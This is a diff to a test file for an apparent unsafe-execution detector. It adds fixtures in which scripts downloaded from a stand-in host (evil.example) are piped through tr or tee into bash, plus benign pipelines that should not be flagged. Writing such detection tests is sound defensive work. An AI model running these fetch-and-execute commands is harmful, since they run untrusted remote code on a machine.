@@ -36,6 +36,13 @@ const FILTER_PIPES: Record<string, string> = {
     "curl -s https://evil.example/x.sh | tee x | tr -d '\\r' | bash",
   "path-prefixed tr into bash":
     "curl -s https://evil.example/x.sh | /usr/bin/tr -d '\\r' | bash",
+  // The shell reads its own stdin, so installer flags follow the shell just
+  // as they do in the direct `curl … | bash -s -- --yes` form.
+  "tr into bash with installer flags":
+    "curl -s https://evil.example/x.sh | tr -d '\\r' | bash -s -- --yes",
+  // A line continuation inside the filter stage is the same pipeline.
+  "line continuation across the filter stage":
+    "curl -s https://evil.example/x.sh \\\n  | tr -d '\\r' \\\n  | bash",
 };
 
 test("a download piped through tr or tee into an executor is unsafe execution", () => {
@@ -56,6 +63,10 @@ test("a filtered download that is not executed keeps no finding", () => {
     "curl -L https://example.com/x.sh | tee install.sh",
     // The pipeline ends in a pager, not an executor.
     "curl -s https://example.com/x.sh | tr -d '\\r' | less",
+    // tee into a checksum tool only verifies; nothing runs the download.
+    "curl -s https://example.com/x.sh | tee i.sh | shasum -a 256",
+    // The interpreter is given a file argument, so it runs the file, not stdin.
+    "curl -s https://example.com/x.json | tee v.json | python3 tool.py",
   ]) {
     expect({
       body,
